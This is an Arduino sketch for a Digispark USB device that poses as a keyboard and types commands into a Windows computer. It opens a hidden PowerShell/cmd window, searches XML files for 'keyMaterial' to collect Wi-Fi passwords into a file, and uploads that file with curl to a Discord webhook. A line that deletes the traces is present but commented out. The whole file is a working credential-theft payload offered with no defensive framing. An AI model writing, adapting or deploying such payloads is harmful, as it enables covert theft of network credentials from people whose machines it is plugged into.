#include "DigiKeyboard.h"
//Ruturaj
void setup() {
  pinMode(1, OUTPUT);
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell -WindowStyle Hidden -Command \"cmd /k 'mode con: cols=15 lines=1 & cd %appdata%'\"");
  DigiKeyboard.delay(2000);
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("powershell Select-String -Path *.xml -Pattern 'keyMaterial' > wifi_pass");
  DigiKeyboard.delay(3000);
  DigiKeyboard.println("curl -X POST https://discord.com/api/webhooks/sdw432342423wesdfadaI -F file=@%APPDATA%\\wifi_pass");
  DigiKeyboard.delay(1000);
  //DigiKeyboard.println("del wifi_* /s /f /q");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}
